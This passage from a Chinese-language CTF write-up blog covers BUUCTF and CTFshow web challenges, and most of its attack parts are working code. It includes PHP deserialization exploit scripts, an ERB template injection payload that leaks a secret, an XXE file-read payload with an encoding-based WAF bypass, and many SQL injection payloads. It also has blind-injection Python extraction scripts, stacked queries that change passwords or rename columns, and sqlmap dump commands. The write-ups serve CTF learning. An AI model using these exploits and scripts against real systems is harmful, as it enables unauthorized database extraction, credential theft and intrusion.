(!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n}\n```\n\n发现其中可以对token进行修改，而后查看调用链\n\n```PHP\nclass Info{\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);//CtrlCase=new dbCtrl;\n    }\n}\n```\n\nInfo中的`__call`方法能调用`login`方法\n\n```PHP\nclass User\n{\n    public function __toString()\n    {\n        $this->nickname->update($this->age);//nikename=new Info;\n        return \"0-0\";\n    }\n}\n```\n\nUser中的`__toString`方法调用`__call`方法\n\n```PHP\nClass UpdateHelper{\n    public function __destruct()\n    {\n        echo $this->sql;//sql=new User;\n    }\n}\n```\n\n链子：`UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`\n\n下一步就是构造payload了，反序列化所使用的方法是\n\n```PHP\npublic function update(){\n    $Info=unserialize($this->getNewinfo());\n}\npublic function getNewInfo(){\n    $age=$_POST['age'];\n    $nickname=$_POST['nickname'];\n    return safe(serialize(new Info($age,$nickname)));\n}\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n```\n\n由于题中先对传入参量进行info序列化而后再通过safe函数进行反序列化，所以最终链子其实变成了`Info::任意参量=UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`，并且这是一个字符逃逸的序列化\n\n```php\n//exp.php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $id=\"1\";\n    public $age='select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name=\"admin\";\n    public $password=\"1\";\n    public $mysqli;\n    public $token;\n    public $feng;\n}\n$a=new Info();\n$a->CtrlCase=new UpdateHelper();\n$a->CtrlCase->sql=new User();\n$a->CtrlCase->sql->nickname=new Info();\n$a->CtrlCase->sql->nickname->CtrlCase=new dbCtrl();\nfor($i=1;$i<=95;$i++){\n    echo \"'\";\n}\n?>\";s:8:\"nickname\";N;s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";s:1:\"1\";s:3:\"age\";s:72:\"select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":9:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";N;s:4:\"feng\";N;}}}}}\n```\n\n传入age，任意密码登录admin即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-19 00.37.26.png)\n\n## [b01lers2020]Life on Mars\n\n抓包随便点一个东西，发现传参，测试是sql注入\n\nsqlmap和手动注入都可以，发现当前数据库下没有结果，在另外一个`alien_code`数据库中\n\n最终payload\n\n```\n\n```\n\n\n\n\n\n## [SCTF2019]Flag Shop\n\n本来以为是jwt直接破解或伪造，没想到是代码审计，我还不认识//////////，是ruby的模版注入，在robots.txt中能看到源代码位置\n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\n看到使用了REB包，是[ruby/erb的模版注入](ruby/erb的模版注入)\n\n大概内容就是使用`<%=`标签可以执行ruby语句并将结果转换为字符串，而题中有 `if params[:do] == \"#{params[:name][0,7]} is working\" then`这句判定，在判定相等的时候会返回`#{params[:name][0,7]} working successfully!`，我们如果把name位置构造成我们想要的参量就可以拿到我们想要的内容\n\n尝试传入$0（当前运行app名称）发现回显成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-16 23.23.05.png)\n\n|      |                                                              |\n| ---- | ------------------------------------------------------------ |\n| 1    | **$！**提出的最后一个异常对象。也可以在*rescue*子句中使用=>来访问异常对象。 |\n| 2    | **$ @**堆栈*回溯*募集的最后一个异常。堆栈*回溯*信息可以通过Exception＃backtrace方法检索最后一个异常。 |\n| 3    | **$ /**输入记录分隔符（默认为换行符）。*获取，readline*等，将他们的输入记录分隔符作为可选参数。 |\n| 4    | **$** 输出记录分隔符（默认为nil）。                          |\n| 5    | **$，**要打印的参数和Array＃join之间的输出分隔符（默认为nil）。您可以将数组明确指定给Array＃join。 |\n| 6    | **$;**split的默认分隔符（默认为nil）。您可以为String＃split指定明确的分隔符。 |\n| 7    | **$。**从当前输入文件读取的最后一行的编号。相当于ARGF.lineno。 |\n| 8    | **$ <**ARGF的同义词                                          |\n| 9    | **$>**$ defout的同义词。                                     |\n| 10   | **$ 0**正在执行的当前Ruby程序的名称。                        |\n| 11   | **$$**正在执行的当前Ruby程序的进程pid。                      |\n| 12   | **$？**最后一个进程的退出状态终止。                          |\n| 13   | **$：**$ LOAD_PATH的同义词。                                 |\n| 14   | **$ DEBUG**如果指定了-d或--debug命令行选项，则为true。       |\n| 15   | **$ defout***print*和*printf*的目标输出（默认*为$ stdout*）。 |\n| 16   | **$ F**指定-a时接收*分割*输出的变量。如果指定-a命令行选项以及-p或-n选项，则设置此变量。 |\n| 17   | **$ FILENAME**目前正在从ARGF读取的文件的名称。相当于ARGF.filename。 |\n| 18   | **$ LOAD_PATH**一个数组，用于加载和要求方法加载文件时要保存要搜索的目录。 |\n| 19   | **$ SAFE**安全级别0→不对外部提供（污染）数据执行检查。（默认）1→禁止使用污染数据的潜在危险操作。2→禁止对进程和文件进行潜在危险的操作。3→所有新创建的对象都被认为是污染的。4→禁止修改全局数据。 |\n| 20   | **$ stdin**标准输入（默认为STDIN）。                         |\n| 21   | **$ stdout**标准输出（默认为STDOUT）。                       |\n| 22   | **$ stderr**标准错误（默认为STDERR）。                       |\n| 23   | **$ VERBOSE**如果指定了-v，-w或--verbose命令行选项，则为True。 |\n| 24   | **$ - x**解释器选项-x（x = 0，a，d，F，i，K，l，p，v）的值。这些选项列在下面 |\n| 25   | **$ -0**解释器选项-x的值和$ /的别名。                        |\n| 26   | **$ -a**解释器选项-x的值，如果选项-a被设置，则为true。只读。 |\n| 27   | **$ -d**解释器选项-x的值和$ DEBUG的别名                      |\n| 28   | **$ -F**解释器选项-x和别名$ ;.                               |\n| 29   | **$ -i**解释器选项-x和in-place-edit模式的值保存扩展名，否则为nil。可以启用或禁用就地编辑模式。 |\n| 30   | **$ -I**解释器选项-x的值和$：的别名。                        |\n| 31   | **$ -l**解释器选项-x的值，如果选项-lis设置为true。只读。     |\n| 32   | **$ -p**解释器选项-x的值，如果选项-pis设置为true。只读。     |\n| 33   | **$ _**局部变量，最后一个字符string通过gets或readline在当前作用域中读取。 |\n| 34   | **$〜**与最后一场比赛相关的局部变量*MatchData*。Regex＃match方法返回最后一个匹配信息。 |\n| 35   | **$ n（$ 1，$ 2，$ 3 ...）**在最后一个模式匹配的第n组中匹配的字符string。相当于m [n]，其中m是*MatchData*对象。 |\n| 36   | **$＆**在最后一个模式匹配中匹配的字符string。相当于m [0]，其中m是*MatchData*对象。 |\n| 37   | **$'**在最后一个模式匹配的匹配之前的字符string。相当于m.pre_match，其中m是*MatchData*对象。 |\n| 38   | **$\"**匹配后的字符string在最后一个模式匹配。相当于m.post_match，其中m是MatchData对象。 |\n| 39   | **$ +**与最后一个模式匹配的最后一个成功匹配的组对应的字符string。 |\n\n这里我们使用第37个，因为在上面最后一次匹配的就是我们想要的密钥\n\npayload：\n\n```\nSECRET=&name=%3C%25%3D%24'%25%3E&do=%3C%25%3D%24'%25%3E%20is%20working\n```\n\n拿到密钥，直接改钱拿flag\n\n## [GKCTF 2021]easycms\n\n提示说后台5位弱口令，点登录注册都没啥反应，推测可能是后台界面，/admin.php，admin/12345登录成功\n\n下一步在设计——主题中，对主题进行编辑后可以导出主题，存在任意文件读取漏洞，直接将theme参量换成base64(/flag)即可\n\n还有另一种方式，在设计——自定义——首页——编辑中可以自行添加php代码，此时需要我们添加文件来验证身份，在设计——组件——素材库——上传素材中存在目录穿越，传入../../../../../system/tmp/xxxx即可，最后保存访问主页就行\n\n## [强网杯 2019]Upload\n\n注册登录，上传测试，发现上传后文件都会被重命名并且后缀被更改为png，估计也没啥上传办法了，看一下cookie，发现是一串banse64编码后的序列化字符串，解码发现其中有头像img文件路径，尝试目录穿越读取文件，失败\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-17 11.35.50.png)\n\n扫！得到源码，来看上传文件，代码审计，审计完发现在每次登录的身份认证中都含有`login_check`，其中可以进行反序列化，看到Profile类中\n\n```php\npublic function __get($name)\n{\n    return $this->except[$name];\n  \t//构造except['index']='img'，$img='upload_img'来调用upload_img方法\n}\npublic function __call($name, $arguments)\n{\n    if($this->{$name}){\n        $this->{$this->{$name}}($arguments);\n    }\n}\n```\n\n然后就是整个反序列化链了，\n\n```\nRegister::__destruct->Profile::upload_img\n通过此处\n@copy($this->filename_tmp, $this->filename);\n@unlink($this->filename_tmp);\n$this->img=\"../upload/$this->upload_menu/$this->filename\";\n将我们构造好的图片马更名并保存，构造如下exp\n```\n\n\n\n```php\n//exp.php\n<?php\nnamespace app\\web\\controller;\nclass Profile\n{\n    public $checker;\n    public $filename_tmp=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/a13d380e153c641dd3cfd5b1273d984b.png\";\n    public $filename=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/1.php\";\n    public $upload_menu;\n    public $ext=\"png\";\n    public $img=\"upload_img\";\n    public $except=[\"index\"=>\"img\"];\n}\nclass Register\n{\n    public $checker;\n    public $registed=false;\n}\n$a=new Profile();\n$b = new Register();\n$b->checker = $a;\necho urlencode(base64_encode(serialize($b)));\n?>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [CSAWQual 2019]Web_Unagi\n\n就差告诉你XXE了，尝试上传一哈\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY kkk SYSTEM \"file:///flag\">\n]>\n<users>\n<user>\n<username>alice</username>\n<password>passwd1</password>\n<name>&kkk;</name>\n<email>alice@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n<user>\n<username>bob</username>\n<password>passwd2</password>\n<name>Bob</name>\n<email>bob@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n</users>\n```\n\n被WAF拦截了，选择编码绕过\n\n> 除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。\n> 更多信息：https://www.w3.org/TR/xml/#sec-guessing\n> 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。\n> 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。\n> 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。\n\n使用命令更改编码\n\n```shell\ncat 1.xml | iconv -f UTF-8 -t UTF-16BE > x16.xml\n```\n\n记得吧内容放到intro中，不然会被裁切\n\n"},{"title":"CTFshow_观星","url":"/posts/21090.html","content":"\n上来就很明显了，是sql注入，尝试单引号闭合\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 22.17.52.png)\n\n被过滤了\n\n测试后发现过滤内容如下：\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: limit\n该字符是非法字符: by\n该字符是非法字符: like\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: '\n该字符是非法字符: \"\n该字符是非法字符: ~\n该字符是非法字符: `\n该字符是非法字符: =\n该字符是非法字符: 空格\n```\n\n常规的sql盲注payload大致为：id=1^if(ascii(substr(database(),1,1))=102,2,3)\n\n1^2=3\n\n1^3=2\n\n到此，给出一些绕过方法，首先是空格可以使用括号或者/**/代替，然后ascii可以使用ord代替，substr中的逗号可以使用substr(字符串 from 1 for 1)来代替使用，if中的逗号可以为使用case语句代替，等于号和like可以用regexp代替，最终替换出的语句如下\n\nid=1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\n\n脚本如下：\n\n```python\n#CTFshow_观星.py\nimport requests\n\nurl = \"http://411c2277-fdd1-4c6d-a294-dddbb8c3579d.challenge.ctf.show/?id=\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm1234567890\"\nfor i in range(1, 50):\n    for j in flagchar:\n        #payload=f\"1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\" 库名：web1\n        #payload=f\"1^case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 表名：flag\n        #payload=f\"1^case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" 列名：flag\n        payload = f\"1^case(ord(substr((select(group_concat(flag))from(flag))from({i})for(1))))when({ord(j)})then(2)else(3)end\"\n        tex=requests.get(url=url+payload).text\n        if \"I asked nothing\" in tex:\n            print(j,end='')\n            break\n\n```\n\n"},{"title":"CTFshowSQL注入","url":"/posts/38885.html","content":"\n**171**\n\n入门开始，直接union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\n返回内容中不能有数字了，试试布尔注入吧\n\nselect * from tableName limit i,n\n\ni为索引，n为数量\n\n随便写的垃圾脚本\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\n啥都没了时间盲注\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\n或者试试文件读写\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\n过滤了union select，大小写绕过或万能密码`1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\n过滤了空格，/**/即可，不能用+，url会被转成空格\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\n过滤了空格和*，制表符%09绕过\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09也没了，还剩%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\n真没招了，看看wp，通过反引号分割，绝\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\n还有\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselect不见了，万能密码\n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflag不见了，其实不影响上面的，但是还是可以尝试模糊匹配\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\n使用正则表达式和布尔盲注\n\n```\nWHERE email REGEXP 'a'\n```\n\n意思是在email中匹配a的\n\n写脚本咯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\n我们将匹配后的表作为右表，使用正则查询即可\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\n记得问on是啥意思\n\n**185**\n\n过滤了数字，用true=1相加构造数字咧\n\n```python\nimport requests\nurl = 'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n```\n\n**186**\n\n同上，开打就完了\n\n**187**\n\n针对`md5(xxx,true)`的绕过：[链接](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\n只能寻找md5\n\n所以密码输入:ffifdyop即可\n\n进行运算得出的结果为\n\n'or'6�]��!r,��b\n\n由于or后面6为真，所以语句恒为真\n\n**188**\n\nSQL比较真真离谱\n\n字符串当作数字处理\n\n即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。\n\n00即可\n\n**189**\n\n空格消失法，提示flag在api/flag.php中，必然要读取文件咯\n\n尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误\n\n布尔盲注走起\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\n进行一个布尔的盲注\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\n过滤了file|into|ascii上个脚本还能用\n\n**192**\n\n过滤了file|into|ascii|ord|hex继续用\n\n**193**\n\n过滤了file|into|ascii|ord|hex|substr问题不大，换left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\n我谢谢你啊left和right都没了\n\n过滤了file|into|ascii|ord|hex|substr|char|left|right|substring，用like或者正则（其实用mid也行）\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\n堆叠改密码咯，查询语句中的username没有用引号包裹，所以查询的时候用十六进制转字符串\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\n😅\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 11.29.32.png)\n\n**197，198**\n\n一个wp脚本\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"登陆成功\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\n我选离谱方法：\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199，200**\n\n只有离谱方法能用了\n\n**201**\n\nsqlmap使用开始\n\n```\n//查库\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//查表\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//查字段 \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//查值\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\n使用POST请求，添加--data参数来设置\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\n调整请求方式，此处调整为PUT请求，记得加上Content-Type不然会变表单提交\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\n加上cookie，用--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php --cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass 